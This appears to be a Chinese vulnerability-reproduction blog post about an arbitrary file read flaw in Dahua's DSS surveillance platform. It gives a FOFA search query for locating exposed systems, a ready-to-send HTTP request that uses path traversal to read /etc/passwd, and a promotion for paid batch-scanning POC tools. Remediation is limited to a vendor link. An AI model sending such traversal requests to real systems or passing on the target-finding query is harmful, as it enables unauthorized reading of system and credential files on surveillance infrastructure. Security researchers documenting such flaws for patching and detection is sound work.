#  大华DSS 系统attachment_downloadAtt.action存在任意文件读取漏洞 附POC   
2024-12-23更新  南风漏洞复现文库   2024-12-24 13:20  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 大华DSS 简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
大华DSS Digital Surveillance System系统。  
## 2.漏洞描述  
  
大华综合安防监控管理平台是基于“All-In-One”理念，全新架构的综合监控管理平台，集主控，转发，存储，管理于一身，具有建设成本低、部署运维简易、组合扩展灵活、性能强悍及安全稳定高可靠等特点。较DSS7000系列升级了硬件配置，增强了性能，还提供了更多的软件功能。大华DSS Digital Surveillance System系统attachment_downloadAtt.action存在远任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
大华DSS Digital Surveillance System系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3aRVRlhBgPhnZSZIQcRU92ApzhHPUqtOYHECJLfIVZy9VRYC7agR6iczKguSpMJPArSGmLM1l0tkGQ/640?wx_fmt=png&from=appmsg "null")  
  
大华DSS Digital Surveillance System系统attachment_downloadAtt.action存在任意文件读取漏洞  
## 4.fofa查询语句  
  
app="dahua-DSS"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd  
  
漏洞数据包：  
```
GET /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aRVRlhBgPhnZSZIQcRU92AqnzCEicL5nVuBQ3GFuBFia19Exsa6grBouLlR0iaBQFje9lQ7dpFGlYhw/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aRVRlhBgPhnZSZIQcRU92Arp307eUqYdeiczZQia3HLFhLjpoBeCtHrdVY6CV8Aj2w4icScJMmLTGVA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3aRVRlhBgPhnZSZIQcRU92A9Haib41LRKW9cfQ7XvOMDNibAyZTjgDteYKhSsrMrsW5pNgYdKC9awvQ/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aRVRlhBgPhnZSZIQcRU92Aa2t6oAcicsD82H8XZjMTXHDCbtqoTuY2Fb0gfFhm35LBc8VJhGhVeTQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aRVRlhBgPhnZSZIQcRU92ASTKs8icZUBq66v7gc3Deb1hTRDaO41coiaVibfZaEv1P8CktVPzDG7PaA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aRVRlhBgPhnZSZIQcRU92AjiciacuTgmY6wW3mrxuJMOgbtnpj013OzDIRH5DzsopdeDxySE0PRpEw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aRVRlhBgPhnZSZIQcRU92AiaANu4jbiaOT3k1DewlibcOibfejoD4GEic10jxyDMY0DzH4EKkSGibBKWnQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请关注厂商主页更新：https://www.dahuatech.com/  
## 8.往期回顾  
  
  
[YourPHPCMS checkEmail接口存在SQL注入漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487973&idx=1&sn=ae1887a94edc58e3f4368af534ceafa6&scene=21#wechat_redirect)  
  
  
[Palo Alto Networks PAN-OS存在远程命令执行漏洞CVE-2024-9474 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487960&idx=1&sn=201e394851f63027036f862d8a36895d&scene=21#wechat_redirect)  
  
  
